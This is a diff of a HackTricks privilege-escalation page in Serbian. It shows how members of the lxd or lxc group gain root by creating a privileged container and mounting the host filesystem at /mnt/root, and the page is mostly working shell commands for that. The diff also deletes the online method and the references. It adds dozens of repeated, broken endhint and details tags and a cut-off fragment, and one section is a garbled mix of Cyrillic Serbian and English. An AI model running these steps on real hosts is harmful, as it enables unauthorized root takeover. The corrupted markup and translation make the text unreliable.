@@ -1,26 +1,52 @@
 # lxd/lxc Grupa - Eskalacija privilegija
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Ako pripadate _**lxd**_ **ili** _**lxc**_ **grupi**, možete postati root.
+Ako pripadate _**lxd**_ **ili** _**lxc**_ **grupi**, možete postati root
 
 ## Eksploatacija bez interneta
 
 ### Metoda 1
 
-Možete instalirati na vašem računaru ovaj alat za izgradnju distribucije: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(pratite uputstva sa github-a):
+Možete instalirati na vašem računaru ovaj distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(pratite uputstva sa github-a):
 ```bash
 sudo su
 #Install requirements
@@ -38,7 +64,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
-Postavite datoteke **lxd.tar.xz** i **rootfs.squashfs**, dodajte sliku u repozitorijum i kreirajte kontejner:
+Otpremite datoteke **lxd.tar.xz** i **rootfs.squashfs**, dodajte sliku u repozitorijum i kreirajte kontejner:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,19 +80,19 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 {% hint style="danger" %}
-Ako pronađete ovu grešku _**Greška: Nije pronađen skladišni prostor. Molimo kreirajte novi skladišni prostor**_\
-Pokrenite **`lxd init`** i **ponovite** prethodni blok komandi
+Ako pronađete ovu grešku _**Greška: Nema pronađenog skladišnog bazena. Molimo kreirajte novi skladišni bazen**_\
+Pokrenite **`lxd init`** i **ponovite** prethodni deo komandi
 {% endhint %}
 
-Na kraju možete izvršiti kontejner i dobiti root pristup:
+Na kraju možete izvršiti kontejner i dobiti root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Metoda 2
+### Метод 2
 
-Izgradite Alpine sliku i pokrenite je koristeći zastavicu `security.privileged=true`, prisiljavajući kontejner da interaguje kao root sa host fajl sistemom.
+Изградите Alpine слику и покрените је користећи флаг `security.privileged=true`, прин forcing контејнер да интерагује као root са хост фајл системом.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -86,37 +112,65 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-# interact with the container
-lxc start mycontainer
-lxc exec mycontainer /bin/sh
-```
-Alternativno [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
-
-## Sa internetom
-
-Možete pratiti [ove instrukcije](https://reboare.github.io/lxd/lxd-escape.html).
-```bash
-lxc init ubuntu:16.04 test -c security.privileged=true
-lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test bash
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
-```
-## Reference
-
-* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
-* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+{% endhint %}
+</details>
+{% endhint %}
